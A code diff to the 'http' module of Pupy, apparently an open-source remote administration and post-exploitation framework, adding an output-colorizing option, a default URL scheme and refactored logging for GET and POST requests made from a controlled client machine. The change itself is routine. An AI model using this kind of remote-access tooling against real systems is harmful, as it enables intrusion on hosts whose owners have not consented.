@@ -1,6 +1,8 @@
 # -*- coding: utf-8 -*-
 
 from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
+from pupylib.PupyOutput import Pygment
+from pygments.lexers import guess_lexer
 
 __class_name__='http'
 
@@ -16,6 +18,7 @@ class http(PupyModule):
         cls.arg_parser = PupyArgumentParser(prog='http', description=cls.__doc__)
         cls.arg_parser.add_argument('-H', '--header', default=[], action='append',
                                          help='User-Agent=Mozilla X-Forwarded-For=127.0.0.1')
+        cls.arg_parser.add_argument('-C', '--color', action='store_true', help='Try to colorize output')
         cls.arg_parser.add_argument('-P', '--proxy', help='Proxy URI (socks://127.0.0.1:1234)')
         cls.arg_parser.add_argument('-o', '--output', help='Output to file')
         cls.arg_parser.add_argument('-i', '--input', help='Input from file (POST)')
@@ -27,6 +30,9 @@ class http(PupyModule):
 
     def run(self, args):
         tinyhttp = self.client.remote('network.lib.tinyhttp')
+
+        if '://' not in args.url:
+            args.url = 'http://' + args.url
 
         http = tinyhttp.HTTP(
             proxy=args.proxy,
@@ -42,26 +48,33 @@ class http(PupyModule):
         )
 
         try:
+            result = None
             if args.input or args.data:
-                self.log(
-                    self.client.obtain_call(
-                        http.post,
-                        args.url,
-                        data=[
-                            tuple(x.split('=', 1)) for x in args.data
-                        ],
-                        file=args.input,
-                        save=args.output
-                    )
+                result = self.client.obtain_call(
+                    http.post,
+                    args.url,
+                    data=[
+                          tuple(x.split('=', 1)) for x in args.data
+                    ],
+                    file=args.input,
+                    save=args.output
                 )
             else:
-                self.log(
-                    self.client.obtain_call(
-                        http.get,
-                        args.url,
-                        save=args.output
-                    )
+                result = self.client.obtain_call(
+                    http.get,
+                    args.url,
+                    save=args.output
                 )
+
+            if result:
+                if args.color:
+                    try:
+                        lexer = guess_lexer(result)
+                        result = Pygment(lexer, result)
+                    except:
+                        pass
+
+                self.log(result)
 
         except Exception, e:
             if hasattr(e, 'reason'):
